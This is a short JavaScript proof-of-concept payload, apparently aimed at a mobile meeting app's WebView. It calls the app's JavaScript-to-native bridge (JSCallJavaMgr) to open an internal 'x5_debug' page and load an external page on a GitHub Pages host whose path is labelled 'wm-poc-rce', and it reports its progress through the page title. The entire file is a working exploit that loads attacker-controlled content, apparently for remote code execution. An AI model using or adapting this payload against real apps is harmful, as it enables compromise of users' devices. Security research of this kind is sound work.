(function(){
  document.title='P106PAY:'+location.host;
  window.__p106cb=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P106CB:'+(r&&r.callId)+':'+(r&&r.code);
  };
  if(!window.JSCallJavaMgr){document.title='P106-NO-TM-BRIDGE';return}
  var target='https://gitwhs.github.io/wm-poc-rce/p106x5.html';
  setTimeout(function(){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p106cb',module:'CommonPlugin',method:'OpenNewPage',callId:'P106X5',
      param:{scheme:'wemeet://page/profile/aboutus/x5_debug',router_params:{url:target,from_webView:true}}
    }));
    document.title='P106-RUN';
  },800);
})();
